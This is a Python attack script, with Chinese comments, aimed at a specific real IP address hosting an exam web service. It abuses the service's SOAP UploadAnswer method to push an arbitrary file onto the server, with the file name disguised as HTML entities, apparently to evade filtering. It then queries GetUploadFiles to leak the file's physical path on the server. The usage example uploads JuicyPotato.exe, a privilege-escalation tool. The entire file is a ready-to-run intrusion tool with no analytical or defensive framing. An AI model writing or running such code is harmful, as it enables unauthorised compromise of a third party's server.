import requests
import base64
import os
import re
import sys

# ================= 配置区域 =================
TARGET_URL = "http://120.55.241.236:999/Models/Exam2020.asmx"
HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "User-Agent": "Eiven.Exam2021 Client"
}

def to_html_entities(text):
    return "".join(f"&#{ord(c)};" for c in text)

def upload_file(local_file_path):
    if not os.path.exists(local_file_path):
        print(f"[-] 本地文件不存在: {local_file_path}")
        return

    filename = os.path.basename(local_file_path)
    print(f"=== 正在上传工具: {filename} ===")

    try:
        # 读取文件
        with open(local_file_path, "rb") as f:
            content = f.read()

        file_b64 = base64.b64encode(content).decode('utf-8')
        print(f"[*] 文件大小: {len(content)} bytes")

        # 1. 上传
        encoded_filename = to_html_entities(filename)
        soap_upload = f"""<?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <UploadAnswer xmlns="http://tempuri.org/">
              <uid>9207</uid>
              <aid>1</aid> <filename>{encoded_filename}</filename>
              <file>{file_b64}</file>
            </UploadAnswer>
          </soap:Body>
        </soap:Envelope>"""

        resp = requests.post(TARGET_URL, data=soap_upload.encode('utf-8'), headers=HEADERS, timeout=30)
        if resp.status_code != 200:
            print(f"[-] 上传请求失败: {resp.status_code}")
            return

        print("[+] 上传成功，正在获取服务器路径...")

        # 2. 获取路径
        soap_list = """<?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetUploadFiles xmlns="http://tempuri.org/">
              <uid>9207</uid>
            </GetUploadFiles>
          </soap:Body>
        </soap:Envelope>"""

        resp_list = requests.post(TARGET_URL, data=soap_list.encode('utf-8'), headers=HEADERS, timeout=10)

        # 查找对应的文件名
        # XML里可能会有多个文件，我们需要找到匹配当前文件名的那个 FullPath
        # 简单正则匹配 <Filename>xxx</Filename>...<FullPath>yyy</FullPath> 可能会因为顺序问题不准
        # 这里为了稳妥，我们假设最后上传的在最后，或者直接搜索特定文件名的路径

        # 我们用 split 暴力解析
        if filename in resp_list.text:
            parts = resp_list.text.split(f"<Filename>{filename}</Filename>")
            if len(parts) > 1:
                # 取后半部分里最近的 FullPath
                sub_part = parts[1].split("</FullPath>")[0]
                if "<FullPath>" in sub_part:
                    full_path = sub_part.split("<FullPath>")[-1]
                    print(f"\n[★] 远程物理路径: {full_path}")
                    return full_path

        # 备选：直接正则抓取所有 FullPath
        matches = re.findall(r"<FullPath>(.*?)</FullPath>", resp_list.text)
        for p in matches:
            if p.endswith(filename):
                print(f"\n[★] 远程物理路径: {p}")
                return p

        print("[-] 未能从服务器响应中解析出路径。")

    except Exception as e:
        print(f"[!] 异常: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python upload_tool.py <local_file_path>")
        print("Example: python upload_tool.py JuicyPotato.exe")
    else:
        upload_file(sys.argv[1])
